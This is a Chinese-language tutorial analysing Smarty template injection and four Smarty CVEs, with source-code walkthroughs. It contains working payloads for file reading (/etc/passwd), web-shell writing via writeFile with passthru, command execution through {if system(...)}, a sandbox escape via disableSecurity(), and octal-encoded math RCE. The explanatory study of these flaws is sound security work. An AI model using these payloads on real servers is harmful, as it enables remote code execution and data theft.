Smarty模板引擎漏洞详解
==============

前言
--

前些时间把Twig模板引擎注入讲述完了，本篇记录了关于Smarty模板引擎注入及相关漏洞的学习。

基础知识
----

在阅读本篇之前，我们需要阅读官方文档  
[Smarty3 手册 | Smarty](https://www.smarty.net/docs/zh_CN/)

引入
--

在详细解释有关Smarty模板引擎漏洞之前，我们在做一些小铺垫，我们来简单说明以下有关Smarty的SSTI的具体内容基本内容

我下面的例子来说明

```php
<?php
require_once('./libs/' . 'Smarty.class.php');
$smarty = new Smarty();
$ip = $_POST['data'];
$smarty->display('string:'.$ip);
?>
```

这里例子虽然简单，但是也基本满足我们对有SSTI此时的需求

常见攻击方法
------

### 任意文件读取

漏洞成因由{include}标签所致，当我们设置成'string:'我们include的文件就会被单纯的输出文件的内容

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-92d7015225a38c215075d48e5ae786499e22f0b3.png)

```php
string:{include file='D:\flag.txt'}
```

### 访问类的静态成员或静态方法。

在Smarty模板引擎中，`self`关键字代表当前类本身，通常用于访问类的静态成员或静态方法。

#### getStreamVariable()

先看payload

```php
{self::getStreamVariable("file:///etc/passwd")}
```

getStreamVariable() 可以利用这个方法来读文件

源码

```php
public function getStreamVariable($variable)
{
        $_result = '';
        $fp = fopen($variable, 'r+');
        if ($fp) {
            while (!feof($fp) && ($current_line = fgets($fp)) !== false) {
                $_result .= $current_line;
            }
            fclose($fp);
            return $_result;
        }
        $smarty = isset($this->smarty) ? $this->smarty : $this;
        if ($smarty->error_unassigned) {
            throw new SmartyException('Undefined stream variable "' . $variable . '"');
        } else {
            return null;
        }
    }
//值得注意的是$variable就是我们要传递的文件的路径。
```

值得注意的是这个方法之存在于Smarty&lt;=3.1.29的版本，在Smarty 3.1.30版本中官方以及删除这个方法。

#### writeFile()

```php
public function writeFile($_filepath, $_contents, Smarty $smarty)
    {
        $_error_reporting = error_reporting();
        error_reporting($_error_reporting & ~E_NOTICE & ~E_WARNING);
        $_file_perms = property_exists($smarty, '_file_perms') ? $smarty->_file_perms : 0644;
        $_dir_perms = property_exists($smarty, '_dir_perms') ? (isset($smarty->_dir_perms) ? $smarty->_dir_perms : 0777)  : 0771;
        if ($_file_perms !== null) {
            $old_umask = umask(0);
        }

        $_dirpath = dirname($_filepath);
        // if subdirs, create dir structure
        if ($_dirpath !== '.' && !file_exists($_dirpath)) {
            mkdir($_dirpath, $_dir_perms, true);
        }

        // write to tmp file, then move to overt file lock race condition
        $_tmp_file = $_dirpath . DS . str_replace(array('.', ','), '_', uniqid('wrt', true));
        if (!file_put_contents($_tmp_file, $_contents)) {
            error_reporting($_error_reporting);
            throw new SmartyException("unable to write file {$_tmp_file}");
       }
```

我们在往上面看，可以看到这个方法是在`class Smarty_Internal_Runtime_WriteFile`下的，

我们注意看这段代码

```php
if (!file_put_contents($_tmp_file, $_contents)) {
            error_reporting($_error_reporting);
            throw new SmartyException("unable to write file {$_tmp_file}");
       }
```

这段代码将文件内容写入临时文件，如果写入失败，则恢复先前的错误报告级别，并抛出异常。

这里的具体解释我会在下面的CVE-2017-1000480具体讲到，先挖个坑，这里写入临时文件，在loadCompiledTemplate函数下，存在语句

```php
eval("?>" . file_get_contents($this->filepath));
```

就有了

```php
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

我们将`<?php passthru($_GET['cmd']); ?>`写入了临时php文件中

`self::clearConfig()` 是一个 Smarty 内部方法，用于清除模板引擎的配置选项。

`$SCRIPT_NAME` 是一个在 PHP 中预定义的变量，用于表示当前执行脚本的文件路径和名称。

### 标签

#### {$smarty.version}

作业：获取smarty的版本信息

#### {literal}

此标签的利用方法仅仅是在php5.x的版本中才可以使用，因为在 PHP5 环境下存在一种 PHP 标签， `<script>language="php"></script>，`我们便可以利用这一标签进行任意的 PHP 代码执行。但是在php7的版本中`{literal}xxxx;{/literal}`标签中间的内容就会被原封不动的输出，并不会解析。

作用：{literal} 可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为 Smarty 的定界符而错被解析。

所以我们就可以利用其的作用来进行xss攻击SSTI等漏洞利用。

```php
{literal}<script>language="php">xxx</script>;{/literal}
```

#### {php}{/php}

用于执行php代码

```php
{php}phpinfo();{/php}  
```

但是这个方法在Smarty3版本中已经被禁用了，不过多赘述了。

#### {if}{/if}

```php
{if phpinfo()}{/if}
{if system('cat /flag')}{/if}
```

沙箱逃逸
----

我们对沙箱这个概念并不陌生，简单来说就是给运行中的程序提供保护机制，在smarty模板引擎中，我们使用enableSecurity 来开启沙箱

Smarty提供了一组内置函数和变量，它们被认为是安全的，不会对服务器产生危害。开发者只能使用这些函数和变量，而不能使用任意的PHP函数和变量。

Smarty运行时会创建一个沙箱环境，限制模板中的代码只能访问特定的变量和函数，而不能访问其他变量和函数。开发者可以使用Smarty提供的函数来控制模板中可以访问的变量和函数。

下面是一个基础沙箱的演示

```php
<?php
require_once('./libs/' . 'Smarty.class.php');
$smarty = new Smarty();
$smarty->enableSecurity(
$ip = $_POST['data'];
$smarty->display($ip);    
```

当然还有更加严格的沙箱

```php
<?php
require_once('./libs/' . 'Smarty.class.php');
$smarty = new Smarty();
$my_security_policy = new Smarty_Security($smarty);
$my_security_policy->php_functions = null;
$my_security_policy->php_handling = Smarty::PHP_REMOVE;
$my_security_policy->php_modifiers = null;
$my_security_policy->static_classes = null;
$my_security_policy->allow_super_globals = false;
$my_security_policy->allow_constants = false;
$my_security_policy->allow_php_tag = false;
$my_security_policy->streams = null;
$my_security_policy->php_modifiers = null;
$smarty->enableSecurity($my_security_policy);
$ip = $_POST['data'];
$smarty->display($ip); 
```

CVE-2017-1000480
----------------

### 概述

版本信息：Smarty &lt;= 3.1.32

演示版本：Smarty 3.1.31

实例代码

```php
<?php
include_once('./smarty/libs/Smarty.class.php');
define('SMARTY_COMPILE_DIR','/tmp/templates_c');
define('SMARTY_CACHE_DIR','/tmp/cache');
class test extends Smarty_Resource_Custom
{
    protected function fetch($name,&$source,&$mtime)
    {
        $template = "CVE-2017-1000480 smarty PHP code injection";
        $source = $template;
        $mtime = time();
    }
}
$smarty = new Smarty();
$my_security_policy = new Smarty_Security($smarty);
$my_security_policy->php_functions = null;
$my_security_policy->php_handling = Smarty::PHP_REMOVE;
$my_security_policy->modifiers = array();
$smarty->enableSecurity($my_security_policy);
$smarty->setCacheDir(SMARTY_CACHE_DIR);
$smarty->setCompileDir(SMARTY_COMPILE_DIR);
$smarty->registerResource('test',new test);
$smarty->display('test:'.$_GET['data']);
?>
```

漏洞点：display方法存在PHP代码执行漏洞

### 漏洞分析

首先看display，display定义在smarty\_internal\_templatebase.php（当前版本路径信息：`smarty-3.1.31\libs\sysplugins\smarty_internal_templatebase.php`）

```php
public function display($template = null, $cache_id = null, $compile_id = null, $parent = null)
    {
        // display template
        $this->_execute($template, $cache_id, $compile_id, $parent, 1);
    }
```

这里调用了\_execute()函数

我们继续跟踪\_execute()函数smarty\_internal\_templatebase.php的156line

```php
private function _execute($template, $cache_id, $compile_id, $parent, $function)
    {
        $smarty = $this->_getSmartyObj();
        $saveVars = true;
        if ($template === null) {
            if (!$this->_isTplObj()) {
                throw new SmartyException($function . '():Missing \'$template\' parameter');
            } else {
                $template = $this;
            }
        } elseif (is_object($template)) {
            /* @var Smarty_Internal_Template $template */
            if (!isset($template->_objType) || !$template->_isTplObj()) {
                throw new SmartyException($function . '():Template object expected');
            }
        } else {
            // get template object
            $saveVars = false;

            $template = $smarty->createTemplate($template, $cache_id, $compile_id, $parent ? $parent : $this, false);
            if ($this->_objType == 1) {
                // set caching in template object
                $template->caching = $this->caching;
            }
        }
...
```

这里定义的一个if结构，很明显我们传入的的$template的值会直接进入else

```php
$template = $smarty->createTemplate($template, $cache_id, $compile_id, $parent ? $parent : $this, false);
```

将原来的$template覆盖成新的变量值，调用createTemplate()方法 目的就是将template最后赋值成一个Smarty\_Internal\_Template的对象

然后进入try结构

关键源码（smarty\_internal\_templatebase.php about 216line）

```php
$result = $template->render(false, $function);
```

调用了Smarty\_Internal\_Template类的render()方法我们继续跟踪

```php
    public function render($no_output_filter = true, $display = null)
    {
        if ($this->smarty->debugging) {
            if (!isset($this->smarty->_debug)) {
                $this->smarty->_debug = new Smarty_Internal_Debug();
            }
            $this->smarty->_debug->start_template($this, $display);
        }
        // checks if template exists
        if (!$this->source->exists) {
            throw new SmartyException("Unable to load template '{$this->source->type}:{$this->source->name}'" .
                                      ($this->_isSubTpl() ? " in '{$this->parent->template_resource}'" : ''));
        }
        // disable caching for evaluated code
        if ($this->source->handler->recompiled) {
            $this->caching = false;
        }
        // read from cache or render
        $isCacheTpl =
            $this->caching == Smarty::CACHING_LIFETIME_CURRENT || $this->caching == Smarty::CACHING_LIFETIME_SAVED;
        if ($isCacheTpl) {
            if (!isset($this->cached) || $this->cached->cache_id !== $this->cache_id ||
                $this->cached->compile_id !== $this->compile_id
            ) {
                $this->loadCached(true);
            }
            $this->cached->render($this, $no_output_filter);
        } else {
            if (!isset($this->compiled) || $this->compiled->compile_id !== $this->compile_id) {
                $this->loadCompiled(true);
            }
            $this->compiled->render($this);
        }
```

上面的几个if是有关模板缓存的，我们先不管，直接进入else语句

```php
public function loadCompiled($force = false)
{
    if ($force || !isset($this->compiled)) {
        $this->compiled = Smarty_Template_Compiled::load($this);
```

我们看到在这个方法当中compiled被定义成了Smarty\_Template\_Compiled类的实例对象，那么我们继续跟踪Smarty\_Template\_Compiled类中的render方法

smarty\_template\_cached.php about 124line

```php
    public function render(Smarty_Internal_Template $_template, $no_output_filter = true)
    {
        if ($this->isCached($_template)) {
            if ($_template->smarty->debugging) {
                if (!isset($_template->smarty->_debug)) {
                    $_template->smarty->_debug = new Smarty_Internal_Debug();
                }
                $_template->smarty->_debug->start_cache($_template);
            }
            if (!$this->processed) {
                $this->process($_template);
//忽略无关代码
```

这里进入了process方法，继续跟踪

路径：smarty\_template\_cached.php about 230 line

```php
public function process(Smarty_Internal_Template $_smarty_tpl)
    {
        $source = &$_smarty_tpl->source;
        $smarty = &$_smarty_tpl->smarty;
        if ($source->handler->recompiled) {
            $source->handler->process($_smarty_tpl);
        } elseif (!$source->handler->uncompiled) {
            if (!$this->exists || $smarty->force_compile ||
                ($smarty->compile_check && $source->getTimeStamp() > $this->getTimeStamp())
            ) {
                $this->compileTemplateSource($_smarty_tpl);
                $compileCheck = $smarty->compile_check;
                $smarty->compile_check = false;
                $this->loadCompiledTemplate($_smarty_tpl);
                $smarty->compile_check = $compileCheck;
            }
           //....
```

进入process方法后检查模板是否需要重新编译。如果模板需要重新编译，则调用模板源文件的处理方法(handler-&gt;process)来生成新的编译文件。如果模板不需要重新编译，则代码检查模板是否已经被编译。如果模板还未被编译或需要强制重新编译($smarty-&gt;force\_compile为true)，或者需要检查模板是否已经被更新($smarty-&gt;compile\_check为true且模板源文件的时间戳大于编译文件的时间戳)，则调用compileTemplateSource方法来编译模板源文件。调用loadCompiledTemplate方法来加载编译文件，并将编译检查标志恢复到原来的值。

我们分别来看和loadCompiledTemplate方法

首先来看compileTemplateSource方法

路径：libs\\sysplugins\\smarty\_template\_compiled.php about 189line

```php
 public function compileTemplateSource(Smarty_Internal_Template $_template)
 ...
        // compile locking
        try {
            // call compiler
            $_template->loadCompiler();
            $this->write($_template, $_template->compiler->compileTemplate($_template));
        }
```

调用了write方法

```php
 public function write(Smarty_Internal_Template $_template, $code)
    {
        if (!$_template->source->handler->recompiled) {
            if ($_template->smarty->ext->_writeFile->writeFile($this->filepath, $code, $_template->smarty) === true) {
                $this->timestamp = $this->exists = is_file($this->filepath);
                if ($this->exists) {
                    $this->timestamp = filemtime($this->filepath);
                    return true;
                }
            }
            return false;
        }
        return true;
    }
```

调用了&gt;writeFile方法，也就是我们上面提到的，我们找到Smarty\_Internal\_Runtime\_WriteFile类下的writeFile方法

```php
public function writeFile($_filepath, $_contents, Smarty $smarty)
   ....
        if (!file_put_contents($_tmp_file, $_contents)) {
            error_reporting($_error_reporting);
            throw new SmartyException("unable to write file {$_tmp_file}");
```

利用

file\_put\_contents来写文件，至此我们完成的`写`的操作

在smarty\_internal\_runtime\_codeframe.php文件的330line

```php
public function compileTemplate(Smarty_Internal_Template $template, $nocache = null,
                                    Smarty_Internal_TemplateCompilerBase $parent_compiler = null)
    {
        // get code frame of compiled template
        $_compiled_code = $template->smarty->ext->_codeFrame->create($template,
                                                                     $this->compileTemplateSource($template, $nocache,
                                                                                                  $parent_compiler),
                                                                     $this->postFilter($this->blockOrFunctionCode) .
                                                                     join('', $this->mergedSubTemplatesCode), false,
                                                                     $this);
        return $_compiled_code;
```

create是生成编译文件代码的方法

```php
$output .= "/* Smarty version " . Smarty::SMARTY_VERSION . ", created on " . strftime("%Y-%m-%d %H:%M:%S") .
                   "\n  from \"" . $_template->source->filepath . "\" */\n\n";
```

我们来loadCompiledTemplate

```php
    private function loadCompiledTemplate(Smarty_Internal_Template $_smarty_tpl)
    {
        if (function_exists('opcache_invalidate') && strlen(ini_get("opcache.restrict_api")) < 1) {
            opcache_invalidate($this->filepath, true);
        } elseif (function_exists('apc_compile_file')) {
            apc_compile_file($this->filepath);
        }
        if (defined('HHVM_VERSION')) {
            eval("?>" . file_get_contents($this->filepath));
        } else {
            include($this->filepath);
        }
    }
```

这里

```php
eval("?>" . file_get_contents($this->filepath));
```

使用了eval函数，从而造成了漏洞，用户在display输入的内容最终会被编译到编译文件代码，然后loadCompiledTemplate中会执行编译文件代码，如果我们输入的内容可以在编译文件代码中可以实现闭合，那么我们就可以实现php任意代码执行。

```php
?data=*/phpinfo();//
```

CVE-2021-26120
--------------

### 概述

环境搭建：[Release v3.1.38 · smarty-php/smarty (github.com)](https://github.com/smarty-php/smarty/releases/tag/v3.1.38)

版本信息 ：Smarty &lt;3.1.39

测试版本 ：Smarty v3.1.38

漏洞描述：{function}中的name属性可以被用户构造，注入恶意代码。

poc：

```php
string:{function name='rce(){};phpinfo();function '}{/function}
```

### 漏洞分析

测试代码

```php
<?php
require_once('./libs/' . 'Smarty.class.php');
$smarty = new Smarty();
$ip = $_POST['data'];
$smarty->display($ip);    
?>
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-b9d361a48de5e6d56199d15058b5963a9537d978.png)  
生成的编译文件代码

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-8eb9cac2f5a09686e510ae88023ef7069707e31a.png)

在 29line中

`function smarty_template_function_rce(){};phpinfo();function _99476291364466ebfcfbe01_07219208(Smarty_Internal_Template $_smarty_tpl,$params) {`我们输入的内容插入代码中，实现闭合也就是说

```php
smarty_template_function_“插入点”_8448067526245a2812ef2c6_13818238(Smarty_Internal_Template $_smarty_tpl,$params) {
```

开始寻找漏洞点，我们直接跳到compileTemplate()方法下 （smarty\_internal\_templatecompilerbase.php about 393line）

```php
public function compileTemplate(
        Smarty_Internal_Template $template,
        $nocache = null,
        Smarty_Internal_TemplateCompilerBase $parent_compiler = null
    ) {
        // get code frame of compiled template
        $_compiled_code = $template->smarty->ext->_codeFrame->create(
            $template,
            $this->compileTemplateSource(
                $template,
                $nocache,
                $parent_compiler
            ),
            $this->postFilter($this->blockOrFunctionCode) .
            join('', $this->mergedSubTemplatesCode),
            false,
            $this
        );
        return $_compiled_code;
    }
```

继续跟进到compileTemplateSource方法中的481line

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-184825336ccb6a66273a6d4eaeafd5ea96b77f0f.png)

`$_content`存入的是我的post传入的值

继续跟踪到callTagCompiler方法，同文件的763line

```php
public function callTagCompiler($tag, $args, $param1 = null, $param2 = null, $param3 = null)
    {
        /* @var Smarty_Internal_CompileBase $tagCompiler */
        $tagCompiler = $this->getTagCompiler($tag);
        // compile this tag
        return $tagCompiler === false ? false : $tagCompiler->compile($args, $this, $param1, $param2, $param3);
    }
```

$tag为function，所以我们进入smarty\_internal\_compile\_function.php，再次文件中分别定义了Smarty\_Internal\_Compile\_Function类和Smarty\_Internal\_Compile\_Functionclose类这两个类分别编译了

{function}和{/function}，下面我们来看一下compile()方法，它也是造成这个漏洞的关键点。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-60ba3bf240b21a54d06db0481779903f3370396f.png)  
其中，这里的$\_name的具体内容就是就是我们function 中的name属性的内容

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-b0e9bb70a5bfd2564ab9344efe7ecadc6f904b60.png)

这里直接就把内容拼接进去了，然后把拼接的内容通过compileTemplateSource这两个方法的共同作用下，最终就是我们看到的编译文件代码loadCompiledTemplate中的`eval("?>" . file_get_contents($this->filepath));`执行了编译文件代码，我们将`$_name=rce(){};phpinfo();function`,这样就是导致前后部分闭合，而中间部分`phpinfo()`暴露，从而导致代码执行。

CVE-2021-26119
--------------

### 概述

环境搭建：[Releases · smarty-php/smarty (github.com)](https://github.com/smarty-php/smarty/releases?page=1)

版本信息：Smarty 模板引擎 &lt;= 3.1.38

测试版本：Smarty 3.1.38

漏洞描述：`{$smarty.template_object}`可以被用来访问到smarty 对象

poc：

```php
string:{$smarty.template_object->smarty->_getSmartyObj()->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->enableSecurity()->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->disableSecurity()->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->addTemplateDir('./x')->display('string:{system(whoami)}')}
string:{$smarty.template_object->smarty->setTemplateDir('./x')->display('string:{system(whoami)}')}
```

### 漏洞分析

当我们利用漏洞点时，我们发现同时出现了两个编译代码文件

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-6cf8df66f0d42d95753536607633dab71702dabe.png)  
以及：

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-0caa611bc2a2aded6ff6fca93727a40497097d74.png)

我们进入debug跟踪以下

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-1fb41d63df33ea4457636e00d8ddfad27cf4e614.png)  
跳入到第一个编译文件代码。

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-81fad3713bb1697c4546c3ca224d04652c538e96.png)

然后进入到第二次display

同样的逻辑进入到第二次

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-517caeed981fcac3e42699114d012d97b4e88435.png)  
跳入到第二个编译文件

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-ad2cac637eafe6d0100d08ecc1ae7a4b2bbcbe19.png)

实现了恶意代码执行

但是这仅仅是根据这个poc来分析的，但是我们还需要去理解它的引用场景以及一些限制

就拿

```php
string:{$smarty.template_object->smarty->disableSecurity()->display('string:{system(whoami)}')}
```

来说明，我们相当于给smarty传入了两次数据，第一次我们访问量了Smarty的这个实例并且调用了disableSecurity()方法，也就是禁用了沙箱并且渲染了后面的display('string:{system(whoami)}')，从而绕过了沙箱机制，这也正反映了我们的漏洞所在：`{$smarty.template_object}`可以被用来访问到smarty 对象。

CVE-2021-29454
--------------

### 概述

漏洞成因：制作恶意数学字符串来运行任意 PHP 代码

版本信息：3.1.42 和 4.0.2 之前

测试版本：3.1.38

poc：

```php
eval:{math equation='("\163\171\163\164\145\155")("\167\150\157\141\155\151")'}
```

### 漏洞分析：

在function.math.php文件中smarty\_function\_math方法下存在eval(),根据eval()可以解析8进制16进制数的特性，从而绕过过滤

![image.png](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-530ecb99d7d849b1b4738134d1a632704f36b9aa.png)

通过debug可以更清楚的看出各个参数的具体情况，方便大家理解整个过程。

参考：
---

[Smarty3 手册 | Smarty](https://www.smarty.net/docs/zh_CN/)

<https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=smarty>

[Smarty 模板注入与沙箱逃逸-安全客 - 安全资讯平台 (anquanke.com)](https://www.anquanke.com/post/id/272393#h3-8)